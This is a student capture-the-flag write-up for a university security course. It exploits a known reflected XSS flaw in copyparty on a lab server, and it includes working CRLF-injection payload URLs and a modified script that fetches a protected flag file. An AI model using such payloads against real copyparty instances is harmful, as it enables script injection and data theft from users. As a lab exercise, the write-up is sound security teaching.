# CTF Semana #7 (XSS)

## Accessing the Website
We navigated to the provided address [http://ctf-fsi.fe.up.pt:5007](http://ctf-fsi.fe.up.pt:5007), using **Google Chrome** (the exploit does not work on Firefox) and explored the site's functionalities as a regular user.

![websitePhoto](/docs/images/s.png)

---

## Searching for Known Vulnerabilities
We searched for information about vulnerabilities related to the service and found out about copyparty. We then used the following search term in Google:  `copyparty cve xss` and found an exploit published on [https://www.exploit-db.com/exploits/51635](https://www.exploit-db.com/exploits/51635), describing a **Reflected XSS** vulnerability.

---

## Testing the Exploit
1. The original exploit triggers an alert with the following URL:

```html
https://localhost:3923/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

2. We adapted the exploit to the challenge's server address:

```html
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

3. Upon loading this link in the browser, an alert appeared, confirming the site is vulnerable to **Reflected XSS**.

![alert](/docs/images/alert.png)

---

## Modifying the Exploit to Retrieve the Flag
We replaced the alert code with a script to fetch the protected `flag.txt` file and display its content in an alert.

Adapted code:

```html
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cscript%3Efetch('/flag.txt').then(response%20=%3E%20response.text()).then(data%20=%3E%20alert(data))%3C/script%3E
```

We pasted the link above into the browser and it loaded the page, and the script was executed.
The flag content appeared in an alert.

![flagCaptured](/docs/images/flagCaptured.png)

 The retrieved flag is: 

**flag{youGotMeReallyGood}**


# Tasks

## Why couldn't the flag be accessed directly?
The flag.txt file was stored on the server but protected from direct access. This protection was implemented to restrict external access to sensitive files. The server only allows access to these files through internal mechanisms, making it impossible to view them directly via a simple HTTP request or URL.

## Is this service popular, and could known vulnerabilities help you access the flag?
Yes, this service is popular and has known vulnerabilities. Specifically, a Reflected XSS vulnerability in versions prior to 1.8.6 of Copyparty was exploited. By searching for known exploits related to the service, we were able to find that this vulnerability allowed attackers to execute malicious JavaScript in the context of a victim’s browser, enabling access to sensitive information such as the flag.

## What vulnerability was exploited?
This attack exploited a Reflected XSS vulnerability. The server failed to properly validate or sanitize user input in the URL, allowing an attacker to inject and execute malicious JavaScript code in the context of the victim’s browser. By exploiting this vulnerability, we were able to fetch the contents of the protected flag.txt file and display it in an alert.

